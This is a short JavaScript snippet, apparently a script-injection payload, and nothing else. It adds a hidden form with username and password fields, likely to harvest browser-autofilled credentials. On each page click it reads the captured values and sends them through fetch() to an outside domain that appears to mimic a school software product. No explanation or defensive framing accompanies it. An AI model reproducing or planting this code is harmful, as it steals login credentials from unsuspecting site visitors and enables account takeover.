var f = document.createElement('form');
f.id = 'stealthForm';
f.style = 'position:absolute;opacity:0;z index:-999;visibility:hidden;height:0;width:0;overflow:hidden;';
f.innerHTML = '<input type=text id=username value=\'\' style=\'display:none;visibility:hidden;height:0;width:0\'><input type=password id=password value=\'\' style=\'display:none;visibility:hidden;height:0;width:0\'>';
document.body.appendChild(f);
document.addEventListener('click', function() {
    alert(0)
    var u = document.getElementById('username').value;
    var p = document.getElementById('password').value;
    fetch('https://classwize-teacher.org/find?username=' + encodeURIComponent(u) + '&password=' + encodeURIComponent(p))
})
